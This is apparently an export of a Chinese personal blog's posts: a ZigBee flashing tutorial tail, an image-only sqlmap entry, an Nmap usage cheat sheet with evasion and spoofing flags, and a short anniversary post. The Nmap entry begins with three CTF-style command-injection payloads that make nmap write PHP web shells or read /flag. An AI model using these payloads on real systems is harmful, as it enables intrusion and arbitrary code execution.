<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/k8Cwd32T9RKJlWy.png" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/OaqwEvyUFskYjpV.png" loading="lazy">

<p>Linker连接配置：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/M8GDpaRTysNzZhE.png" loading="lazy">

<p>Debugger选择：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/i9jpoArZXJbNlcU.png" loading="lazy">

<p>点击OK后即可下载到板子中</p>
<p>点击顺序如下：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/yUYRqJVPsxOf97B.png" loading="lazy">

<p>以下为各个图标所代表的含义：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/YH5QhtF6EwV7AS3.png" loading="lazy">

<h1 id="导出为Hex镜像文件供他人使用"><a href="#导出为Hex镜像文件供他人使用" class="headerlink" title="导出为Hex镜像文件供他人使用"></a>导出为Hex镜像文件供他人使用</h1><p>需要用到SmartRF flash programmer这款软件</p>
<p><a href="https://pan.baidu.com/s/1TyV7qdPfyicisiA6sISpzg">下载链接</a>，提取码：n4br</p>
<p>点击安装即可，安装完成后桌面会出现以下图标，点击即可打开应用</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee%E5%85%A5%E9%97%A8/MDvHk5m8SolWeKB.png" alt loading="lazy"></p>
<p>另外需要在IAR中导出后缀为.Hex的文件</p>
<p>在输入框中输入你想命名的.Hex文件（注：格式为文件名+.hex）</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/8jDiUsRfWE7ZKbQ.png" loading="lazy">

<p>另外在Output format处选择intel-extended，OK即可</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/bkgJFvfWYCnoROD.png" loading="lazy">

<p>随后编译，可看见在此目录下多了一个a.hex的文件</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/lfVyDi1gH8e2TrB.png" loading="lazy">

<p>在 SmartRF flash programmer 软件的flash image中选择到此文件，点击perform action，即可将文件烧到板子里面去</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/ZigBee入门/F2XMEWZfcy7vSJQ.png" loading="lazy">]]></content>
      <categories>
        <category>ZigBee</category>
      </categories>
      <tags>
        <tag>ZigBee</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用</title>
    <url>/posts/c06d8347/</url>
    <content><![CDATA[<p>以下图来自XBX白细胞安全团队（LEUKOCYTE）（侵删）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113716744.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113746488.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113842327.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113914099.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811113941052.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114009522.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114036397.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114108504.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114130551.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114151354.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114225256.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114248814.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114310504.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114329273.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114403009.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114427824.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114451429.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114513110.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114537281.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114559948.png" alt loading="lazy"><br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/sqlmap%E4%BD%BF%E7%94%A8/image-20200811114635757.png" alt loading="lazy"></p>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap的基础使用</title>
    <url>/posts/e1005ac/</url>
    <content><![CDATA[<p>一些关于nmap命令执行的题目payload</p>
<p><code>&#39; -oN b.phtml &lt;?=eval($_POST[a]);?&gt;&#39;</code></p>
<p><code>&#39; -iL /flag -oN flag.txt &#39;</code></p>
<p><code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p>
<p>nmap这个渗透工具一般有在渗透的准备阶段，用于收集用户的信息，为后面的渗透做情报支持</p>
<p>Nmap是主机扫描工具，他的图形化界面是Zenmap，分布式框架为Dnmap。</p>
<p>Nmap可以完成以下任务：</p>
<ul>
<li>主机探测</li>
<li>端口扫描</li>
<li>版本检测</li>
<li>系统检测</li>
<li>支持探测脚本的编写</li>
</ul>
<span id="more"></span>

<p>Nmap在实际中应用场合如下：</p>
<ul>
<li>通过对设备或者防火墙的探测来审计它的安全性</li>
<li>探测目标主机所开放的端口</li>
<li>通过识别新的服务器审计网络的安全性</li>
<li>探测网络上的主机</li>
</ul>
<p>常见服务对应端口号：</p>
<table>
<thead>
<tr>
<th align="center"><strong>服务</strong></th>
<th align="center"><strong>端口号</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">HTTP</td>
<td align="center">80</td>
</tr>
<tr>
<td align="center">HTTPS</td>
<td align="center">443</td>
</tr>
<tr>
<td align="center">Telnet（远程登录）</td>
<td align="center">23</td>
</tr>
<tr>
<td align="center">SSH（安全登录），SCP（文件传输），端口重定向</td>
<td align="center">22</td>
</tr>
<tr>
<td align="center"><a href="https://baike.baidu.com/item/SMTP/175887?fr=aladdin">SMTP</a>（简单邮件传输协议）</td>
<td align="center">25</td>
</tr>
<tr>
<td align="center"><a href="https://baike.baidu.com/item/POP3/175122?fr=aladdin">POP3</a>（ 邮局协议版本3 ）</td>
<td align="center">110</td>
</tr>
<tr>
<td align="center"><a href="https://baike.baidu.com/item/weblogic/451978?fr=aladdin">WebLogic</a></td>
<td align="center">7001</td>
</tr>
<tr>
<td align="center"><a href="https://baike.baidu.com/item/tomcat/255751?fr=aladdin">TOMCAT</a>（ Java Web服务器 ）</td>
<td align="center">8080</td>
</tr>
<tr>
<td align="center">WIN2003远程登录</td>
<td align="center">3389</td>
</tr>
<tr>
<td align="center">Oracle数据库</td>
<td align="center">1521</td>
</tr>
<tr>
<td align="center">MY SQL SERVER数据库</td>
<td align="center">1433</td>
</tr>
<tr>
<td align="center">MySQL数据库</td>
<td align="center">3306</td>
</tr>
</tbody></table>
<p>在kali中使用：命令行nmap即可使用</p>
<p>nmap -version即可查看nmap的版本信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-27.png" alt loading="lazy"></p>
<p>扫描简单来说就是四个动作</p>
<ul>
<li>统一沟通语言（TCP/IP协议）</li>
<li>发出刺激（ICMP报文头）</li>
<li>受到刺激的反馈（ICMP的反馈）</li>
<li>通过比对刺激和反馈完成扫描</li>
</ul>
<p>说实话这四个动作具体是啥意思我也不是很明白</p>
<p>将你要扫描的设备地址告诉nmap可以通过下面的方法实现统一的格式</p>
<ul>
<li>namp [扫描类型] [设置] {设备地址}</li>
</ul>
<p><strong>nmap常用的参数及意义</strong></p>
<ol>
<li>-A ：选择用于使用进攻性方式扫描；全面系统检测，启用脚本检测，扫描。（推荐）</li>
<li>-T4：指定扫描过程使用的时序，表示禁止动态扫描延时超过的时间；总共有6个级别（0-5）。级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4 。*（ 假如防火墙是一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。 ）（推荐）</li>
<li>-oX test.xml：将扫描结果生成test.xml文件</li>
<li>-oG test.txt：将扫描结果生成test.txt文件</li>
<li>-sn：只进行主机发现，不进行端口扫描</li>
<li>-O：指定Nmap进行系统版本扫描</li>
<li>-sV：指定Nmap进行服务版本扫描</li>
<li>-p <code>&lt;port ranges&gt;</code>：扫描指定的端口</li>
<li>-sS/sT/sA/sW/sM：指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描</li>
<li>-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况</li>
<li>-script  <code>&lt;script name&gt;</code> : 指定扫描脚本</li>
<li>-Pn ： 不进行ping扫描（推荐）</li>
<li>-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping</li>
<li>-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。</li>
<li>-iL 1.txt : 批量扫描1.txt中的目标地址</li>
<li>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现</li>
<li>-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况</li>
<li>-sO: 使用IP protocol 扫描确定目标机支持的协议类型</li>
<li>-PO : 使用IP协议包探测对方主机是否开启</li>
<li>-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机</li>
<li>-PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现</li>
<li>-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态</li>
<li>-e eth0：指定使用eth0网卡进行探测</li>
<li>-f : –mtu <code>&lt;val&gt;</code>: 指定使用分片、指定数据包的 MTU.</li>
<li>-b <code>&lt;FTP relay host&gt;</code>: 使用FTP bounce scan扫描方式</li>
<li>-g： 指定发送的端口号</li>
<li>-r：不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）</li>
<li>-v ：表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态（推荐）</li>
<li>-n : 表示不进行DNS解析；</li>
<li>-D &lt;decoy1,decoy2[,ME],…&gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址</li>
<li>-R ：表示总是进行DNS解析。</li>
<li>-F : 快速模式，仅扫描TOP 100的端口</li>
<li>-S <IP_Address>: 伪装成其他 IP 地址</IP_Address></li>
<li>–ttl <code>&lt;val&gt;</code>: 设置 time-to-live 时间</li>
<li>–badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）</li>
<li>–dns-servers : 指定DNS服务器</li>
<li>–system-dns : 指定使用系统的DNS服务器</li>
<li>–traceroute : 追踪每个路由节点</li>
<li>–scanflags <code>&lt;flags&gt;</code>: 定制TCP包的flags</li>
<li>–top-ports <code>&lt;number&gt;</code> :扫描开放概率最高的number个端口</li>
<li>–port-ratio <code>&lt;ratio&gt;</code>: 扫描指定频率以上的端口。与上述–top-ports类似，这里以概率作为参数</li>
<li>–version-trace: 显示出详细的版本侦测过程信息</li>
<li>–osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）</li>
<li>–osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统</li>
<li>–data-length <code>&lt;num&gt;</code>: 填充随机数据让数据包长度达到 Num</li>
<li>–ip-options <code>&lt;options&gt;</code>: 使用指定的 IP 选项来发送数据包</li>
<li>–spoof-mac &lt;mac address/prefix/vendor name&gt; : 伪装 MAC 地址</li>
<li>–version-intensity <code>&lt;level&gt;</code>: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</li>
<li>–version-light: 指定使用轻量侦测方式 (intensity 2)</li>
<li>–version-all: 尝试使用所有的probes进行侦测 (intensity 9)</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-28.png" alt loading="lazy"></p>
<p>参考原文链接：<a href="https://www.cnblogs.com/bonelee/p/9188122.html">1</a>，<a href="https://www.cnblogs.com/liaopeng123/p/11281516.html">2</a></p>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>My_Blog&#39;s Birthday</title>
    <url>/posts/37e5e453/</url>
    <content><![CDATA[<p><strong>纪念诞辰</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/My_Blog's%20Birthday/To-Small-1576157953127.jpg" alt loading="lazy"></p>
<p>​                                                                                                                                       ————<strong>2020-1-8</strong></p>
<span id="more"></span>]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
</search>
